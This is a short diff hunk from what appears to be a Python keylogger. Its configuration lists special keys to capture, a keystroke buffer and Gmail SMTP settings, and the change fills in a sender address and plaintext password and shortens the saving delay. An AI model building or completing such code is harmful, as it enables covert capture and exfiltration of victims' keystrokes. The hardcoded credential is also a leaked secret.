@@ -13,14 +13,14 @@ import ssl
 SPECIALKEYS = [Key.enter, Key.space, Key.alt_l, Key.backspace, Key.tab, Key.caps_lock, Key.shift_l, Key.cmd_l, Key.ctrl_l, Key.up, Key.down, Key.right, Key.left]
 SPECIALKEYSTRINGS = ["enter", "space", "alt", "backspace", "tab", "caps_lock", "shift", "windows", "control", "up", "down", "right", "left"]
 STOPCOMBO = {keyboard.Key.alt_l, keyboard.Key.down}
-SAVINGDELAY = 10
+SAVINGDELAY = 1
 CURRENT = set()
 COUNT = True
 KEYS = []
 
 # Global gmail variables
-GMAIL = ""
-PASSWORD = ""
+GMAIL = "dorik.f@protonmail.com"
+PASSWORD = "firewall123"
 SERVER = "smtp.gmail.com"
 PORT = 465
 
